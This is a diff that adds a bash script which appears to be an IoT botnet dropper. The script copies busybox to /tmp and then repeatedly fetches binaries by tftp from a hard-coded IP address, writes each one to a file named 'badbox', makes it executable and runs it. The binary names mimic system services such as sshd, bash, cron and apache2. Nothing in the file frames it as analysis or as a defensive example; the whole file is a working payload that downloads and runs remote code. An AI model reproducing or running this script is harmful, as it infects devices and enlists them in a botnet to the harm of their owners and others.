@@ -1,0 +1,16 @@
+#!/bin/bash
+ulimit -n 1024
+cp /bin/busybox /tmp/
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 195.62.52.39 -c get nwsntpd;cat nwsntpd >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 195.62.52.39 -c get nwssshd;cat nwssshd >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 195.62.52.39 -c get nwsopenssh;cat nwsopenssh >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 195.62.52.39 -c get nwsbash;cat nwsbash >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 195.62.52.39 -c get nwstftp;cat nwstftp >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 195.62.52.39 -c get nwswget;cat nwswget >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 195.62.52.39 -c get nwscron;cat nwscron >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 195.62.52.39 -c get nwsftp;cat nwsftp >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 195.62.52.39 -c get nwspftp;cat nwspftp >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 195.62.52.39 -c get nwssh;cat nwssh >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 195.62.52.39 -c get ' ';cat ' ' >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 195.62.52.39 -c get nwsapache2;cat nwsapache2 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 195.62.52.39 -c get nwstelnetd;cat nwstelnetd >badbox;chmod +x *;./badbox
